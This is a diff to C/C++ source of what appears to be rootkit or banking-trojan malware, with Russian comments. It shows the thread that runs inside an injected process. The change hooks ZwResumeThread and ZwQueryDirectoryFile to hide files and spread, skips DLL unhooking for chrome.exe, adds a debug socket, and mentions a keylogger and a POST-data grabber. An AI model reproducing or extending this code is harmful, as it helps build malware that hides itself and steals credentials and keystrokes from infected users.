@@ -417,8 +417,17 @@ DWORD GetPidByThread(HANDLE hThread )
 
 
 
+
+
 void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 {
+
+
+	#ifdef _DEBUG_SOCKET_H_
+		 StartDebugSocket(); 
+	#endif
+
+
 	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 	//инициализируем систему оповещения о пост данных, должен быть запущен раньше кейлогера
 	//т. к. в кейлогере есть системы которым нужен инициализированный модуль PostDataGrabber
@@ -503,6 +512,7 @@ void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 			HookCmdLine();
 		}
 	#endif
+
 }
 
 
@@ -561,10 +571,6 @@ DWORD WINAPI RootkitThread(LPVOID)
 	// Приостанавливаем всепотоки
    //	StartStopProcessThreads(true);
 
-    // Поток работает в заинжекченном процессе
-	UnhookDlls();
-	HookZwResumeThread();	
-	HookZwQueryDirectoryFile();
 
 	// Подготавливаем данные для события
 	TEventData Data;
@@ -578,6 +584,20 @@ DWORD WINAPI RootkitThread(LPVOID)
 	Data.Application = AppName.t_str();
 	DWORD hashApp = File::GetNameHashA((PCHAR)AppName.t_str(), true);
 	RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str() );
+
+    // Поток работает в заинжекченном процессе
+	// Дл всех приложений, кроме хрома снимаем хуки.
+	// Хрм сам ставит хуки, по этому, если их снть
+	// нарушается ег работспосбность.
+	
+	if (hashApp != 0xBD3CC33A /* chrome.exe */)
+		UnhookDlls();
+
+
+
+	HookZwResumeThread();	
+	HookZwQueryDirectoryFile();
+
 
 	RootkitDoStartApplication(&Data, hashApp); 
 
